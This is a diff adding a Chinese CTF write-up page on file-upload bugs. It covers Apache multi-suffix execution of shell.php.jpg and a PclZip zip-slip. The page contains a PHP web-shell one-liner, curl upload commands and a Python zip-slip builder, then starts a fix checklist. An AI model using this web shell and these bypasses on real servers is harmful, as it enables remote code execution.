@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>文件上传漏洞 · N1BOOK WEB 进阶</title>
+<link href="https://fonts.googleapis.com/css2?family=Kalam:wght@300;400;700&family=Patrick+Hand&family=Zeyada&display=swap" rel="stylesheet">
+<link href="https://unpkg.com/lucide-static@latest/font/lucide.min.css" rel="stylesheet">
+<style>
+  :root {
+    --paper-bg: #fdf6e3;
+    --paper-dark: #f5ecd3;
+    --paper-line: #e8e0cc;
+    --ink-black: #2c2c2c;
+    --ink-red: #c0392b;
+    --ink-blue: #2980b9;
+    --ink-green: #27ae60;
+    --ink-purple: #8e44ad;
+    --ink-orange: #e67e22;
+    --highlight-yellow: rgba(255, 235, 59, 0.35);
+    --highlight-pink: rgba(255, 105, 180, 0.25);
+    --highlight-green: rgba(46, 204, 113, 0.2);
+    --highlight-orange: rgba(255, 152, 0, 0.2);
+    --tape: rgba(255, 255, 255, 0.45);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #3d3d3d;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    padding: 40px 20px;
+    font-family: 'Kalam', cursive;
+    overflow-x: hidden;
+  }
+
+  .desk {
+    position: relative;
+    width: 100%;
+    max-width: 920px;
+  }
+
+  .notebook {
+    position: relative;
+    background: var(--paper-bg);
+    background-image:
+      linear-gradient(90deg, transparent 79px, #e8d5b5 79px, #e8d5b5 81px, transparent 81px),
+      linear-gradient(var(--paper-line) 1px, transparent 1px);
+    background-size: 100% 100%, 100% 2.4rem;
+    background-position: 0 0, 0 0;
+    border-radius: 4px;
+    box-shadow:
+      0 1px 2px rgba(0,0,0,0.15),
+      0 4px 8px rgba(0,0,0,0.12),
+      0 8px 16px rgba(0,0,0,0.1),
+      0 16px 32px rgba(0,0,0,0.08),
+      15px 25px 40px rgba(0,0,0,0.15);
+    padding: 3rem 2.5rem 3rem 6rem;
+    line-height: 2.4rem;
+    color: var(--ink-black);
+    transform: rotate(-0.3deg);
+    animation: paperFloat 6s ease-in-out infinite;
+  }
+
+  @keyframes paperFloat {
+    0%, 100% { transform: rotate(-0.3deg) translateY(0); }
+    50% { transform: rotate(-0.1deg) translateY(-3px); }
+  }
+
+  /* ===== 螺旋装订 ===== */
+  .spiral-holes {
+    position: absolute;
+    left: 20px;
+    top: 0;
+    bottom: 0;
+    width: 50px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-around;
+    padding: 2rem 0;
+  }
+
+  .hole {
+    width: 14px;
+    height: 14px;
+    background: #3d3d3d;
+    border-radius: 50%;
+    box-shadow: inset 1px 1px 2px rgba(0,0,0,0.5);
+    position: relative;
+  }
+
+  .hole::after {
+    content: '';
+    position: absolute;
+    top: -4px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 28px;
+    height: 6px;
+    background: linear-gradient(180deg, #888 0%, #bbb 50%, #888 100%);
+    border-radius: 3px;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+  }
+
+  /* ===== 装饰元素 ===== */
+  .tape {
+    position: absolute;
+    width: 120px;
+    height: 35px;
+    background: var(--tape);
+    opacity: 0.6;
+    transform: rotate(-3deg);
+    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    backdrop-filter: blur(1px);
+  }
+
+  .tape.top-left {
+    top: -12px;
+    left: 40px;
+    transform: rotate(-4deg);
+  }
+
+  .tape.top-right {
+    top: -10px;
+    right: 60px;
+    transform: rotate(3deg);
+    width: 100px;
+  }
+
+  .paperclip {
+    position: absolute;
+    top: 40px;
+    right: 30px;
+    width: 30px;
+    height: 70px;
+    border: 3px solid #b0b0b0;
+    border-radius: 0 0 15px 15px;
+    border-top: none;
+    transform: rotate(-5deg);
+    box-shadow: 2px 2px 4px rgba(0,0,0,0.15);
+    z-index: 10;
+  }
+
+  .paperclip::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 6px;
+    width: 12px;
+    height: 25px;
+    border: 3px solid #b0b0b0;
+    border-bottom: none;
+    border-radius: 15px 15px 0 0;
+  }
+
+  .coffee-stain {
+    position: absolute;
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    border: 3px solid rgba(139, 90, 43, 0.12);
+    box-shadow:
+      0 0 0 8px rgba(139, 90, 43, 0.06),
+      0 0 0 16px rgba(139, 90, 43, 0.03);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .coffee-stain.one { bottom: 60px; right: 40px; }
+  .coffee-stain.two { top: 200px; left: 100px; opacity: 0.5; }
+
+  .folded-corner {
+    position: absolute;
+    bottom: 0;
+    right: 0;
+    width: 50px;
+    height: 50px;
+    background: linear-gradient(135deg, transparent 50%, var(--paper-dark) 50%);
+    border-bottom-right-radius: 4px;
+    box-shadow: -2px -2px 4px rgba(0,0,0,0.08);
+  }
+
+  .doodle {
+    position: absolute;
+    pointer-events: none;
+    opacity: 0.7;
+  }
+
+  /* ===== 标题系统 ===== */
+  .title {
+    font-family: 'Zeyada', cursive;
+    font-size: 3.2rem;
+    font-weight: 700;
+    color: var(--ink-black);
+    margin-bottom: 0.5rem;
+    line-height: 1.2;
+    position: relative;
+    display: inline-block;
+  }
+
+  .title-underline {
+    position: absolute;
+    bottom: 2px;
+    left: -5px;
+    right: -10px;
+    height: 8px;
+    background: var(--highlight-yellow);
+    z-index: -1;
+    border-radius: 4px;
+    transform: rotate(-1deg);
+  }
+
+  .subtitle {
+    font-family: 'Patrick Hand', cursive;
+    font-size: 1.3rem;
+    color: var(--ink-blue);
+    margin-bottom: 1.5rem;
+    transform: rotate(-0.5deg);
+  }
+
+  .date-badge {
+    display: inline-block;
+    font-size: 0.95rem;
+    color: var(--ink-blue);
+    margin-bottom: 1.5rem;
+    transform: rotate(-1deg);
+  }
+
+  /* ===== 段落系统 ===== */
+  .section {
+    margin-bottom: 2rem;
+    position: relative;
+  }
+
+  .section-title {
+    font-family: 'Patrick Hand', cursive;
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: var(--ink-red);
+    margin-bottom: 0.5rem;
+    display: inline-block;
+    position: relative;
+  }
+
+  .section-title .marker-underline {
+    position: absolute;
+    bottom: 0;
+    left: -3px;
+    right: -5px;
+    height: 4px;
+    background: var(--ink-red);
+    opacity: 0.3;
+    border-radius: 2px;
+  }
+
+  .content {
+    font-size: 1.15rem;
+    text-align: justify;
+    position: relative;
+  }
+
+  /* ===== 文字高亮 ===== */
+  .highlight {
+    background: var(--highlight-yellow);
+    padding: 0 3px;
+    border-radius: 2px;
+  }
+
+  .highlight-pink {
+    background: var(--highlight-pink);
+    padding: 0 3px;
+    border-radius: 2px;
+  }
+
+  .highlight-green {
+    background: var(--highlight-green);
+    padding: 0 3px;
+    border-radius: 2px;
+  }
+
+  .highlight-orange {
+    background: var(--highlight-orange);
+    padding: 0 3px;
+    border-radius: 2px;
+  }
+
+  /* ===== 彩色文字 ===== */
+  .red-text { color: var(--ink-red); font-weight: 700; }
+  .blue-text { color: var(--ink-blue); }
+  .green-text { color: var(--ink-green); }
+  .purple-text { color: var(--ink-purple); }
+  .orange-text { color: var(--ink-orange); font-weight: 700; }
+
+  /* ===== 下划线样式 ===== */
+  .underline-wavy {
+    text-decoration: underline;
+    text-decoration-style: wavy;
+    text-decoration-color: var(--ink-red);
+    text-underline-offset: 3px;
+  }
+
+  .double-underline {
+    border-bottom: 3px double var(--ink-red);
+    padding-bottom: 1px;
+  }
+
+  /* ===== 代码术语 ===== */
+  .code-term {
+    font-family: 'Courier New', monospace;
+    font-size: 0.95em;
+    background: rgba(0,0,0,0.06);
+    padding: 0 4px;
+    border-radius: 3px;
+    border-bottom: 1.5px solid var(--ink-purple);
+  }
+
+  /* ===== 代码块 ===== */
+  .code-block {
+    display: block;
+    margin: 0.8rem 0;
+    padding: 0.8rem 1rem;
+    background: #2d2d2d;
+    color: #f8f8f2;
+    border-radius: 8px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.95rem;
+    line-height: 1.6;
+    overflow-x: auto;
+    box-shadow: 3px 3px 8px rgba(0,0,0,0.2);
+    transform: rotate(0.3deg);
+    position: relative;
+  }
+
+  .code-block::before {
+    content: '';
+    position: absolute;
+    top: -6px;
+    left: 15px;
+    width: 50px;
+    height: 12px;
+    background: rgba(255,255,255,0.3);
+    border: 1px solid rgba(0,0,0,0.1);
+    transform: rotate(-2deg);
+  }
+
+  .code-comment { color: #75715e; }
+  .code-keyword { color: #66d9ef; }
+  .code-string { color: #a6e22e; }
+
+  /* ===== 标签系统 ===== */
+  .badge {
+    display: inline-block;
+    padding: 0.15rem 0.5rem;
+    background: var(--ink-red);
+    color: #fff;
+    border-radius: 4px;
+    font-size: 0.9rem;
+    font-weight: 700;
+    margin-right: 0.3rem;
+  }
+
+  .badge.blue { background: var(--ink-blue); }
+  .badge.green { background: var(--ink-green); }
+  .badge.purple { background: var(--ink-purple); }
+  .badge.orange { background: var(--ink-orange); }
+
+  /* ===== 版本/年份徽章 ===== */
+  .version-badge, .year-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    padding: 0.4rem 0.8rem;
+    background: linear-gradient(135deg, rgba(192,57,43,0.1) 0%, rgba(231,76,60,0.05) 100%);
+    border: 2px solid var(--ink-red);
+    border-radius: 8px;
+    font-size: 1.1rem;
+    color: var(--ink-red);
+    font-weight: 700;
+    margin: 0.5rem 0;
+    transform: rotate(-1deg);
+  }
+
+  .version-number, .year-number {
+    font-size: 1.4rem;
+    font-family: 'Zeyada', cursive;
+  }
+
+  /* ===== 警告框 ===== */
+  .big-warning {
+    margin: 1.5rem 0;
+    padding: 1rem 1.5rem;
+    background: repeating-linear-gradient(
+      45deg,
+      rgba(255,235,59,0.15),
+      rgba(255,235,59,0.15) 10px,
+      rgba(255,235,59,0.25) 10px,
+      rgba(255,235,59,0.25) 20px
+    );
+    border: 2px solid var(--ink-red);
+    border-radius: 8px;
+    text-align: center;
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--ink-red);
+    transform: rotate(0.5deg);
+    position: relative;
+  }
+
+  .big-warning::before,
+  .big-warning::after {
+    content: '!!!';
+    position: absolute;
+    font-size: 1rem;
+    color: var(--ink-red);
+    opacity: 0.6;
+  }
+
+  .big-warning::before { top: 5px; left: 10px; }
+  .big-warning::after { bottom: 5px; right: 10px; }
+
+  /* ===== 紧急警告框 ===== */
+  .urgent-box {
+    margin: 1.5rem 0;
+    padding: 1rem 1.5rem;
+    background: repeating-linear-gradient(
+      -45deg,
+      rgba(231,76,60,0.1),
+      rgba(231,76,60,0.1) 10px,
+      rgba(231,76,60,0.2) 10px,
+      rgba(231,76,60,0.2) 20px
+    );
+    border: 3px solid var(--ink-red);
+    border-radius: 8px;
+    text-align: center;
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: var(--ink-red);
+    transform: rotate(-0.5deg);
+    position: relative;
+  }
+
+  /* ===== 便签 ===== */
+  .side-note {
+    position: absolute;
+    right: -40px;
+    top: 0;
+    width: 140px;
+    padding: 0.6rem;
+    background: #fff9c4;
+    border: 1px solid #f0e68c;
+    box-shadow: 3px 3px 8px rgba(0,0,0,0.12);
+    font-size: 0.9rem;
+    line-height: 1.4;
+    color: var(--ink-black);
+    transform: rotate(4deg);
+    z-index: 5;
+  }
+
+  .side-note::before {
+    content: '';
+    position: absolute;
+    top: -8px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 40px;
+    height: 14px;
+    background: rgba(255,255,255,0.5);
+    border: 1px solid rgba(0,0,0,0.08);
+  }
+
+  .side-note.left {
+    right: auto;
+    left: 150px;
+    transform: rotate(-3deg);
+    background: #ffcdd2;
+    border-color: #ef9a9a;
+  }
+
+  .side-note.blue {
+    background: #bbdefb;
+    border-color: #90caf9;
+    transform: rotate(2deg);
+  }
+
+  .side-note.green {
+    background: #c8e6c9;
+    border-color: #a5d6a7;
+    transform: rotate(-2deg);
+  }
+
+  .side-note.purple {
+    background: #e1bee7;
+    border-color: #ce93d8;
+    transform: rotate(3deg);
+  }
+
+  /* ===== 流程图 ===== */
+  .flow-box {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin: 0.8rem 0;
+    padding: 0.6rem 1rem;
+    background: rgba(255,255,255,0.4);
+    border: 2px dashed var(--ink-blue);
+    border-radius: 8px;
+    transform: rotate(0.5deg);
+  }
+
+  .flow-item {
+    display: inline-block;
+    padding: 0.2rem 0.6rem;
+    background: #fff;
+    border: 1.5px solid var(--ink-black);
+    border-radius: 6px;
+    font-size: 1rem;
+    box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+    position: relative;
+  }
+
+  .flow-arrow {
+    font-size: 1.3rem;
+    color: var(--ink-red);
+  }
+
+  /* ===== 对比框 ===== */
+  .compare-box {
+    margin: 1rem 0;
+    padding: 1rem 1.2rem;
+    background: linear-gradient(135deg, rgba(41,128,185,0.08) 0%, rgba(52,152,219,0.05) 100%);
+    border-left: 4px solid var(--ink-blue);
+    border-radius: 0 8px 8px 0;
+    transform: rotate(-0.2deg);
+  }
+
+  .compare-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.8rem;
+    margin-bottom: 0.8rem;
+    font-size: 1.1rem;
+  }
+
+  .compare-row:last-child { margin-bottom: 0; }
+
+  .compare-label {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    min-width: 70px;
+    height: 28px;
+    background: var(--ink-blue);
+    color: #fff;
+    border-radius: 4px;
+    font-size: 0.85rem;
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  .compare-label.old { background: var(--ink-purple); }
+  .compare-label.new { background: var(--ink-green); }
+
+  /* ===== 攻击链/步骤 ===== */
+  .attack-flow, .attack-path {
+    margin: 1rem 0;
+    padding: 1rem 1.2rem;
+    background: linear-gradient(135deg, rgba(192,57,43,0.08) 0%, rgba(231,76,60,0.05) 100%);
+    border-left: 4px solid var(--ink-red);
+    border-radius: 0 8px 8px 0;
+    transform: rotate(-0.3deg);
+  }
+
+  .attack-step, .attack-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.6rem;
+    margin-bottom: 0.6rem;
+    font-size: 1.1rem;
+  }
+
+  .attack-step:last-child, .attack-row:last-child { margin-bottom: 0; }
+
+  .step-num, .attack-icon {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    min-width: 26px;
+    height: 26px;
+    background: var(--ink-red);
+    color: #fff;
+    border-radius: 50%;
+    font-size: 0.85rem;
+    font-weight: 700;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  /* ===== 问题框 ===== */
+  .question-box {
+    margin: 1rem 0;
+    padding: 1rem;
+    background: rgba(41,128,185,0.08);
+    border: 2px solid var(--ink-blue);
+    border-radius: 8px;
+    position: relative;
+    transform: rotate(0.3deg);
+  }
+
+  .question-box::before {
+    content: '?';
+    position: absolute;
+    top: -15px;
+    left: 15px;
+    width: 30px;
+    height: 30px;
+    background: var(--ink-blue);
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 1.1rem;
+  }
+
+  /* ===== 安全状态框 ===== */
+  .safe-box {
+    margin: 1rem 0;
+    padding: 1rem 1.2rem;
+    background: linear-gradient(135deg, rgba(39,174,96,0.08) 0%, rgba(46,204,113,0.05) 100%);
+    border-left: 4px solid var(--ink-green);
+    border-radius: 0 8px 8px 0;
+    transform: rotate(-0.2deg);
+  }
+
+  .safe-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.6rem;
+    margin-bottom: 0.5rem;
+    font-size: 1.05rem;
+  }
+
+  .safe-row:last-child { margin-bottom: 0; }
+
+  .safe-check {
+    color: var(--ink-green);
+    font-weight: 700;
+    font-size: 1.2rem;
+    flex-shrink: 0;
+  }
+
+  /* ===== 修复方案框 ===== */
+  .fix-box, .update-box {
+    margin: 1rem 0;
+    padding: 1rem 1.2rem;
+    background: linear-gradient(135deg, rgba(41,128,185,0.08) 0%, rgba(52,152,219,0.05) 100%);
+    border-left: 4px solid var(--ink-blue);
+    border-radius: 0 8px 8px 0;
+    transform: rotate(0.2deg);
+  }
+
+  .fix-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.6rem;
+    margin-bottom: 0.5rem;
+    font-size: 1.05rem;
+  }
+
+  .fix-row:last-child { margin-bottom: 0; }
+
+  .fix-icon {
+    color: var(--ink-blue);
+    font-weight: 700;
+    font-size: 1.2rem;
+    flex-shrink: 0;
+  }
+
+  /* ===== 配置框 ===== */
+  .config-box {
+    margin: 1rem 0;
+    padding: 1rem 1.2rem;
+    background: linear-gradient(135deg, rgba(142,68,173,0.08) 0%, rgba(155,89,182,0.05) 100%);
+    border-left: 4px solid var(--ink-purple);
+    border-radius: 0 8px 8px 0;
+    transform: rotate(0.2deg);
+    font-family: 'Courier New', monospace;
+    font-size: 0.95rem;
+    line-height: 1.8;
+  }
+
+  .config-tag {
+    display: inline-block;
+    padding: 0.1rem 0.4rem;
+    background: var(--ink-purple);
+    color: #fff;
+    border-radius: 3px;
+    font-size: 0.85rem;
+  }
+
+  /* ===== 菜单路径 ===== */
+  .menu-path {
+    display: inline-block;
+    padding: 0.3rem 0.8rem;
+    background: linear-gradient(135deg, #f5f5f5 0%, #e0e0e0 100%);
+    border: 2px solid #bdbdbd;
+    border-radius: 6px;
+    font-family: 'Courier New', monospace;
+    font-size: 0.95rem;
+    box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+    transform: rotate(-0.5deg);
+  }
+
+  /* ===== 网格布局 ===== */
+  .os-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 0.5rem;
+    margin: 0.8rem 0;
+    padding: 0.8rem;
+    background: rgba(255,255,255,0.4);
+    border: 2px dashed var(--ink-red);
+    border-radius: 8px;
+    transform: rotate(0.3deg);
+  }
+
+  .os-item {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0.4rem 0.3rem;
+    background: #fff;
+    border: 1.5px solid var(--ink-black);
+    border-radius: 6px;
+    font-size: 0.95rem;
+    box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+    text-align: center;
+  }
+
+  .os-item.danger {
+    border-color: var(--ink-red);
+    color: var(--ink-red);
+    font-weight: 700;
+  }
+
+  /* ===== 总结框 ===== */
+  .summary-box {
+    margin: 1.5rem 0;
+    padding: 1.5rem;
+    background: linear-gradient(135deg, rgba(41,128,185,0.08) 0%, rgba(52,152,219,0.05) 100%);
+    border: 2px solid var(--ink-blue);
+    border-radius: 8px;
+    transform: rotate(0.3deg);
+  }
+
+  .summary-title {
+    font-family: 'Patrick Hand', cursive;
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--ink-blue);
+    margin-bottom: 0.8rem;
+    text-align: center;
+  }
+
+  /* ===== 信任三角 ===== */
+  .trust-triangle {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 1rem;
+    margin: 1rem 0;
+    flex-wrap: wrap;
+  }
+
+  .trust-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 0.6rem 1rem;
+    background: #fff;
+    border: 2px solid var(--ink-black);
+    border-radius: 8px;
+    box-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+    min-width: 100px;
+  }
+
+  .trust-label {
+    font-size: 0.85rem;
+    color: #666;
+    margin-bottom: 0.2rem;
+  }
+
+  .trust-value {
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: var(--ink-red);
+  }
+
+  /* ===== 分割线 ===== */
+  .divider {
+    margin: 2rem 0;
+    text-align: center;
+    position: relative;
+  }
+
+  .divider::before {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 20%;
+    right: 20%;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--ink-red), transparent);
+  }
+
+  .divider-text {
+    display: inline-block;
+    padding: 0 1rem;
+    background: var(--paper-bg);
+    position: relative;
+    font-family: 'Zeyada', cursive;
+    font-size: 1.6rem;
+    color: var(--ink-red);
+    font-weight: 700;
+  }
+
+  /* ===== 标记符号 ===== */
+  .check-mark { color: var(--ink-green); font-weight: 700; }
+  .cross-mark { color: var(--ink-red); font-weight: 700; }
+  .star-mark { color: var(--ink-red); font-size: 1.3rem; vertical-align: middle; }
+
+  /* ===== 入场动画 ===== */
+  .write-in {
+    opacity: 0;
+    transform: translateY(8px);
+    animation: writeIn 0.6s ease forwards;
+  }
+
+  @keyframes writeIn {
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  /* ===== 响应式 ===== */
+  @media (max-width: 768px) {
+    .notebook {
+      padding: 2rem 1.5rem 2rem 4rem;
+      background-position: 0 0, 0 0;
+      background-image:
+        linear-gradient(90deg, transparent 59px, #e8d5b5 59px, #e8d5b5 61px, transparent 61px),
+        linear-gradient(var(--paper-line) 1px, transparent 1px);
+    }
+    .title { font-size: 2.2rem; }
+    .content { font-size: 1rem; }
+    .side-note, .side-note.left, .side-note.blue, .side-note.green, .side-note.purple {
+      position: relative;
+      right: auto;
+      left: auto;
+      width: 100%;
+      margin: 0.5rem 0;
+      transform: rotate(1deg);
+    }
+    .os-grid { grid-template-columns: repeat(2, 1fr); }
+    .trust-triangle { flex-direction: column; }
+    .spiral-holes { left: 12px; width: 40px; }
+    .hole { width: 10px; height: 10px; }
+    .hole::after { width: 22px; height: 5px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="desk">
+  <div class="notebook">
+    <!-- 螺旋装订孔与纸张装饰 -->
+    <div class="spiral-holes">
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+      <div class="hole"></div><div class="hole"></div><div class="hole"></div>
+    </div>
+    <div class="tape top-left"></div>
+    <div class="tape top-right"></div>
+    <div class="paperclip"></div>
+    <div class="coffee-stain one"></div>
+    <div class="coffee-stain two"></div>
+    <div class="folded-corner"></div>
+
+    <!-- 封面信息 -->
+    <div class="title write-in" style="animation-delay:0.1s">
+      文件上传漏洞
+      <div class="title-underline"></div>
+    </div>
+    <div class="subtitle write-in" style="animation-delay:0.3s">
+      N1BOOK · WEB 进阶 · 源码泄露 / Apache 多后缀 / PclZip zip-slip
+    </div>
+    <div class="date-badge write-in" style="animation-delay:0.4s">
+      2026.08.01　|　CTF / WEB　|　核心：后缀校验 ≠ 执行安全
+    </div>
+
+    <div class="big-warning write-in" style="animation-delay:0.5s">
+      图片后缀不代表文件一定是“静态图片”——<span class="red-text">shell.php.jpg</span> 在 Apache + mod_php 下仍可能按 PHP 执行
+    </div>
+
+    <!-- 1. 环境与线索 -->
+    <div class="section">
+      <div class="section-title write-in" style="animation-delay:0.65s">
+        <i class="lucide-search"></i> 先看环境：线索比 payload 更重要
+        <div class="marker-underline"></div>
+      </div>
+      <div class="content write-in" style="animation-delay:0.75s">
+        <span class="badge blue">入口</span> 页面只有一个 <span class="code-term">multipart/form-data</span> 文件上传表单；首页直接输出 <span class="code-term">show_source(__FILE__)</span>，源码泄露成为最重要突破口。
+      </div>
+      <div class="flow-box write-in" style="animation-delay:0.85s">
+        <span class="flow-item">GET 首页</span>
+        <span class="flow-arrow">→</span>
+        <span class="flow-item">show_source</span>
+        <span class="flow-arrow">→</span>
+        <span class="flow-item">拿到过滤逻辑</span>
+        <span class="flow-arrow">→</span>
+        <span class="flow-item">构造绕过</span>
+      </div>
+      <div class="config-box write-in" style="animation-delay:0.95s">
+        <span class="config-tag">响应头 / 404 线索</span><br>
+        前端：<span class="blue-text">openresty</span>　|　后端：<span class="purple-text">Apache/2.4.7 + PHP/5.5.9</span><br>
+        关键推断：后端使用 <span class="code-term">mod_php</span>，需要重点考虑 Apache 的多后缀解析。
+      </div>
+    </div>
+
+    <!-- 2. 过滤逻辑 -->
+    <div class="section">
+      <div class="section-title write-in" style="animation-delay:1.1s">
+        <i class="lucide-bug"></i> 漏洞一：最后一个点决定“白名单后缀”
+        <div class="marker-underline"></div>
+      </div>
+      <div class="content write-in" style="animation-delay:1.2s">
+        代码用 <span class="code-term">strrchr($name, '.')</span> 找到最后一个点，再取其后的字符串。它只验证最后一段，没有验证完整文件名中是否出现过 <span class="highlight-pink">.php</span>。
+      </div>
+      <div class="attack-flow write-in" style="animation-delay:1.3s">
+        <div class="attack-step"><span class="step-num">1</span><span>文件名：<span class="code-term">shell.php.jpg</span></span></div>
+        <div class="attack-step"><span class="step-num">2</span><span>后缀提取：只看到 <span class="highlight">jpg</span> → 通过白名单。</span></div>
+        <div class="attack-step"><span class="step-num">3</span><span>真实文件名仍保留 <span class="highlight-pink">.php</span> 这一段。</span></div>
+        <div class="attack-step"><span class="step-num">4</span><span>Apache 从右向左尝试处理器：<span class="code-term">.jpg</span> 无处理器 → 继续识别 <span class="red-text">.php</span> → 交给 mod_php。</span></div>
+      </div>
+      <div class="question-box write-in" style="animation-delay:1.4s">
+        记忆点：<span class="red-text">应用层只看最后一段</span>，而 Apache 可能继续向左找可执行扩展；两套规则叠加才形成 RCE。
+      </div>
+    </div>
+
+    <!-- 3. zip-slip -->
+    <div class="section">
+      <div class="section-title write-in" style="animation-delay:1.55s">
+        漏洞二：PclZip 解压目录穿越
+        <div class="marker-underline"></div>
+      </div>
+      <div class="content write-in" style="animation-delay:1.65s">
+        ZIP 分支只拦截“以 <span class="code-term">.php</span> 结尾”的条目，却没有检查条目名中的 <span class="highlight-pink">../</span>。PclZip 2.8.2 解压时直接拼接目标路径，导致文件可写出临时目录。
+      </div>
+      <div class="compare-box write-in" style="animation-delay:1.75s">
+        <div class="compare-row"><span class="compare-label old">条目名</span><span><span class="code-term">../../shell2.php.jpg</span>：结尾是 jpg，不匹配 <span class="code-term">/\.php$/</span>。</span></div>
+        <div class="compare-row"><span class="compare-label new">解压后</span><span><span class="code-term">upload/&lt;md5&gt;/../../shell2.php.jpg</span> → 解析 <span class="red-text">..</span> → 写入 web 根目录。</span></div>
+        <div class="compare-row"><span class="compare-label new">清理范围</span><span><span class="code-term">check_dir()</span> 只递归 <span class="blue-text">upload/</span>，根目录文件不会被这段逻辑删除。</span></div>
+      </div>
+    </div>
+
+    <!-- 4. 两条利用路径 -->
+    <div class="section">
+      <div class="section-title write-in" style="animation-delay:1.9s">
+        利用路径：快解与预期解
+        <div class="marker-underline"></div>
+      </div>
+      <div class="attack-flow write-in" style="animation-delay:2s">
+        <div class="attack-step"><span class="step-num">A</span><span><span class="badge orange">最快</span> 直接上传 <span class="code-term">shell.php.jpg</span> → 文件落在 <span class="code-term">upload/&lt;md5&gt;/</span> → 请求文件触发 Apache 多后缀解析。</span></div>
+        <div class="attack-step"><span class="step-num">B</span><span><span class="badge purple">预期解</span> ZIP 条目使用 <span class="code-term">../../shell2.php.jpg</span> → PclZip 穿越到 web 根目录 → 同样依靠多后缀执行。</span></div>
+      </div>
+      <div class="code-block write-in" style="animation-delay:2.1s"><span class="code-comment"># 方法 A：构造并上传多后缀文件</span>
+<span class="code-keyword">printf</span> <span class="code-string">'&lt;?php echo "PWNED:"; system($_GET["c"]); ?&gt;'</span> &gt; shell.php.jpg
+curl -s -F <span class="code-string">"file=@shell.php.jpg;filename=shell.php.jpg"</span> \
+  <span class="code-string">"https://fe9d1596f84ce172688eabb3.http-ctf2.dasctf.com/"</span>
+curl -s <span class="code-string">"https://目标/upload/&lt;md5&gt;/shell.php.jpg"</span></div>
+      <div class="code-block write-in" style="animation-delay:2.2s"><span class="code-comment"># 方法 B：构造 zip-slip 条目</span>
+<span class="code-keyword">import</span> zipfile
+<span class="code-keyword">with</span> zipfile.ZipFile(<span class="code-string">'evil.zip'</span>, <span class="code-string">'w'</span>) <span class="code-keyword">as</span> z:
+    z.write(<span class="code-string">'payload.jpg'</span>, <span class="code-string">'../../shell2.php.jpg'</span>)</div>
+    </div>
+
+    <!-- 5. 失败路径 -->
+    <div class="section">
+      <div class="section-title write-in" style="animation-delay:2.35s">
+        失败路径：为什么不能“随便传”
+        <div class="marker-underline"></div>
+      </div>
+      <div class="os-grid write-in" style="animation-delay:2.45s">
+        <span class="os-item danger"><span class="code-term">shell.php</span><br>后缀被拒</span>
+        <span class="os-item danger">ZIP 内<br><span class="code-term">shell.php</span><br>被正则拦</span>
+        <span class="os-item danger"><span class="code-term">../../shell.php</span><br>后缀仍是 php</span>
+        <span class="os-item">普通 <span class="code-term">normal.jpg</span><br>静态返回</span>
+        <span class="os-item">直接穿越文件名<br>代理会归一化</span>
+        <span class="os-item danger">必须保留<br><span class="code-term">.php.</span> 前缀段</span>
+      </div>
+      <div class="side-note blue write-in" style="animation-delay:2.55s">
+        判断成功与否：动态响应通常无 ETag，返回 text/plain；纯 jpg 会被当作静态资源。
+      </div>
+    </div>
+
+    <!-- 6. 防守视角 -->
+    <div class="section">
+      <div class="section-title write-in" style="animation-delay:2.7s">
+        <i class="lucide-shield"></i> 修复清单：把“文件名”和“执行权限”一起管住
+        <div class="marker-underline"></div>
+      </div>
+      <div class="fix-box write-in" style="animation-delay:2.8s">
+        <div class="fix-row"><span class="fix-icon">1</span><span>校验完整文件名：不仅检查 <span class="code-term">pathinfo()</span> 的扩展名，还要拒绝任意位置出现的 <span class="red-text">.php</span>。</span></div>
+        <div class="fix-row"><span class="fix-icon">2</span><span>上传后随机重命名，例如 <span class="code-term">md5(uniqid()).jpg</span>，不要让用户控制落盘文件名。</span></div>
